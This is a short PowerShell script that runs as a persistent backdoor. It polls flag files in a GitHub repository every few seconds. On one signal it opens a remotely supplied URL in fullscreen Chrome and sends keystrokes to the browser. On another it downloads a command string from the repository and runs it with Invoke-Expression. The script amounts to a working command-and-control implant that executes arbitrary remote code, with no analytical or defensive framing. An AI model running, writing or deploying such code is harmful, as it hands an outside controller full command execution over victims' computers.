$wshell = New-Object -ComObject wscript.shell;
function yut {
$wshell.SendKeys('{ESC}')
[system.Diagnostics.Process]::Start("chrome",$link) | Out-Null
sleep 2
$wshell.SendKeys('{F11}')
sleep -Seconds 9
$wshell.SendKeys('f')
sleep 1
$wshell.SendKeys('{up}')
sleep 1
$wshell.SendKeys('{up}')
}
$a = $True
$b = $True
while(1){
$response = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/213" -UseBasicParsing
$response.Content -match 'rawLines":..(.*?)..,' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
if(($Matches[1] -eq 1) -and (!$a)){
$a = $True
}
if(($Matches[1] -eq 0) -and ($a)){
$l = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/link" -UseBasicParsing
$l.Content -match 'rawLines":..(.*?)..,' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
$link = $Matches[1]
yut
$a = $False
}
$p = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/312" -UseBasicParsing
$p.Content -match 'rawLines":..(.*?)..,' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
if(($Matches[1] -eq 0) -and (!$b)){
$b = $True
}
if(($Matches[1] -eq 1) -and ($b)){
$c = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/command" -UseBasicParsing
$c.Content -match 'rawLines":..(.*?)..,.stylingDirectives' | Out-Null
$Matches[1] = $Matches[1] -replace '\\',''
Invoke-Expression $Matches[1]
$b = $False
}
sleep -Seconds 3
}
